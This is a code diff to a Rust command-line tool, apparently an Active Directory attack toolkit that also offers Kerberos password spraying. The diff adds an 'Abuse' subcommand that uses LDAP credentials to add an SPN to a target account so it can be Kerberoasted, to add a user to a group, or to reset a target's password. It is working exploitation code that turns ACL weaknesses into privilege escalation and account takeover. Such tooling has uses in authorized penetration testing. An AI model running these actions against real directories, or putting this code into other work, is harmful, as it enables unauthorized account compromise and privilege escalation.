@@ -26,6 +26,29 @@ enum Command {
     Lsa(LsaArgs),
     /// Kerberos password spray / user enumeration (no LDAP needed).
     Spray(SprayArgs),
+    /// Active LDAP abuse: add-spn (targeted Kerberoast) / add-member / set-password.
+    Abuse(AbuseArgs),
+}
+
+#[derive(Parser)]
+struct AbuseArgs {
+    #[arg(long)]
+    url: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    #[arg(long)]
+    insecure: bool,
+    /// add-spn | add-member | set-password
+    #[arg(long)]
+    action: String,
+    /// Target sAMAccountName (the object to modify; the group for add-member)
+    #[arg(long)]
+    target: String,
+    /// Value: the SPN, the member sAMAccountName, or the new password
+    #[arg(long)]
+    value: String,
 }
 
 #[derive(Parser)]
@@ -117,7 +140,40 @@ async fn main() -> Result<()> {
         Command::Samr(a) => samr(a).await,
         Command::Lsa(a) => lsa(a).await,
         Command::Spray(a) => spray(a).await,
+        Command::Abuse(a) => abuse(a).await,
     }
+}
+
+/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
+async fn abuse(a: AbuseArgs) -> Result<()> {
+    let cfg = LdapConfig {
+        url: a.url.clone(),
+        bind_dn: a.user.clone(),
+        password: a.password.clone(),
+        base_dn: None,
+        insecure: a.insecure,
+        gssapi: false,
+    };
+    let mut c = Collector::connect(&cfg).await?;
+    let target_dn = c.resolve_dn(&a.target).await?;
+
+    match a.action.as_str() {
+        "add-spn" => {
+            c.add_value(&target_dn, "servicePrincipalName", &a.value).await?;
+            println!("[+] added SPN '{}' to {} — now Kerberoastable", a.value, a.target);
+        }
+        "add-member" => {
+            let member_dn = c.resolve_dn(&a.value).await?;
+            c.add_value(&target_dn, "member", &member_dn).await?;
+            println!("[+] added {} to group {}", a.value, a.target);
+        }
+        "set-password" => {
+            c.set_password(&target_dn, &a.value).await?;
+            println!("[+] reset password of {}", a.target);
+        }
+        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password)"),
+    }
+    Ok(())
 }
 
 /// Kerberos password spray: one password across a user list, classified by KDC response.
